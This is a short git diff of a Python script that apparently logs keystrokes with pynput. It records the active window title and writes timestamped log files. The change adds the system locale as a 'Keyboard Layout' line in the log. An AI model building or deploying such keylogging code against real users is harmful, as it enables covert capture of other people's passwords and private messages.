@@ -1,8 +1,8 @@
 import os
-
 import win32gui
 from pynput import keyboard
 from datetime import datetime
+import locale
 
 if __name__ == '__main__':
 
@@ -14,6 +14,14 @@ if __name__ == '__main__':
         os.makedirs(log_dir)
     log_file = log_dir + "log " + current_time + ".txt"
 
+
+    def get_current_keyboard_layout():
+        return locale.setlocale(locale.LC_ALL, '')
+
+
+    keyboard_layout = get_current_keyboard_layout()
+    with open(log_file, "a") as f:
+        f.write("Keyboard Layout: {}\n".format(keyboard_layout))
 
     # get the window that the user is on while pressing on keys
     def get_active_window_title():
